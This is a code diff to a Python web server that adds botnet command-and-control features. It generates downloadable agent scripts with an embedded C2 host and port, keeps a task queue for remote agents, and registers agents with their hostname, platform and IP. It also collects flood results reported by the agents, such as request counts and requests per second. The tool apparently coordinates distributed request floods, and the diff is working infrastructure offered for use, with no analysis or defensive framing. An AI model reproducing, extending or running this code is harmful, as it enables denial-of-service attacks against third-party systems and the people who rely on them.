@@ -53,9 +53,19 @@ def _apply_config(host, port):
     # Rebuild shared opener
     eng.OPENER = eng.build_opener()
 
-# ── Bot registry ──────────────────────────────────────────────────────────────
-_bots_lock = threading.Lock()
-_bots = {}   # id -> { id, ip, label, registered_at, last_seen }
+# ── Agent / Bot registry ──────────────────────────────────────────────────────
+_bots_lock  = threading.Lock()
+_bots       = {}   # id -> { id, ip, hostname, platform, label, registered_at, last_seen, status }
+
+# Agent task queue: id -> pending task dict (or None)
+_tasks_lock = threading.Lock()
+_tasks      = {}   # agent_id -> task dict | None
+
+# Agent results log
+_results_lock = threading.Lock()
+_results      = []   # list of result dicts (last 200)
+
+AGENT_TEMPLATE = os.path.join(HERE, "agent", "agent_template.py")
 
 # ── Shared SSE / flood state ──────────────────────────────────────────────────
 _lock         = threading.Lock()
@@ -251,6 +261,60 @@ class Handler(BaseHTTPRequestHandler):
                 self._json({"bots": list(_bots.values())})
             return
 
+        # ── Agent API ─────────────────────────────────────────────────────────
+        if path == "/api/agent/generate":
+            # Generate agent script with baked-in C2 address
+            qs     = parsed.query  # e.g. host=1.2.3.4&port=5000
+            params = {}
+            for part in qs.split("&"):
+                if "=" in part:
+                    k, v = part.split("=", 1)
+                    params[k] = v
+            c2_host = params.get("host", "").strip()
+            c2_port = params.get("port", str(PORT)).strip()
+            if not c2_host:
+                self._json({"ok": False, "error": "host param required"})
+                return
+            try:
+                with open(AGENT_TEMPLATE, "r") as f:
+                    src = f.read()
+            except Exception as e:
+                self._json({"ok": False, "error": str(e)})
+                return
+            src = src.replace("__C2_HOST__", c2_host).replace("__C2_PORT__", c2_port)
+            data_out = src.encode()
+            filename = "agent_{}.py".format(c2_host.replace(".", "_"))
+            self.send_response(200)
+            self._cors()
+            self.send_header("Content-Type",        "text/plain; charset=utf-8")
+            self.send_header("Content-Disposition", 'attachment; filename="{}"'.format(filename))
+            self.send_header("Content-Length",      str(len(data_out)))
+            self.end_headers()
+            self._safe_write(data_out)
+            return
+
+        if path == "/api/agent/task":
+            qs     = parsed.query
+            params = {}
+            for part in qs.split("&"):
+                if "=" in part:
+                    k, v = part.split("=", 1)
+                    params[k] = v
+            agent_id = params.get("id", "").strip()
+            with _tasks_lock:
+                task = _tasks.pop(agent_id, None)
+            # Also check global stop flag
+            if eng._STOP.is_set():
+                self._json({"task": None, "stop": True})
+            else:
+                self._json({"task": task, "stop": False})
+            return
+
+        if path == "/api/agent/results":
+            with _results_lock:
+                self._json({"results": list(_results)})
+            return
+
         # Static files
         if path == "/":
             path = "/index.html"
@@ -351,11 +415,62 @@ class Handler(BaseHTTPRequestHandler):
             self._json({"ok": True, "removed": removed is not None})
 
         elif path == "/api/bots/ping":
-            # Bots call this periodically to update last_seen
             bot_id = str(data.get("id", "")).strip()
             with _bots_lock:
                 if bot_id in _bots:
                     _bots[bot_id]["last_seen"] = time.time()
+            self._json({"ok": True})
+
+        # ── Agent endpoints (called by agent.py on remote devices) ────────────
+        elif path == "/api/agent/register":
+            aid      = str(data.get("id", "")).strip()
+            hostname = str(data.get("hostname", "")).strip()
+            platform = str(data.get("platform", "")).strip()
+            ip       = str(data.get("ip", "")).strip()
+            if not aid:
+                self._json({"ok": False, "error": "id required"})
+                return
+            now = time.time()
+            with _bots_lock:
+                _bots[aid] = {
+                    "id":            aid,
+                    "ip":            ip,
+                    "hostname":      hostname,
+                    "platform":      platform,
+                    "label":         hostname or aid,
+                    "registered_at": now,
+                    "last_seen":     now,
+                }
+            with _tasks_lock:
+                if aid not in _tasks:
+                    _tasks[aid] = None
+            _broadcast({"type": "bot_update", "bots": list(_bots.values())})
+            self._json({"ok": True})
+
+        elif path == "/api/agent/ping":
+            aid = str(data.get("id", "")).strip()
+            with _bots_lock:
+                if aid in _bots:
+                    _bots[aid]["last_seen"] = time.time()
+            self._json({"ok": True})
+
+        elif path == "/api/agent/result":
+            aid  = str(data.get("agent_id", "")).strip()
+            entry = {
+                "agent_id":   aid,
+                "task_id":    data.get("task_id", ""),
+                "total":      data.get("total", 0),
+                "success":    data.get("success", 0),
+                "errors":     data.get("errors", 0),
+                "rps_actual": data.get("rps_actual", 0),
+                "wall":       data.get("wall", 0),
+                "ts":         time.time(),
+            }
+            with _results_lock:
+                _results.insert(0, entry)
+                if len(_results) > 200:
+                    _results.pop()
+            _broadcast({"type": "agent_result", "result": entry})
             self._json({"ok": True})
 
         else:
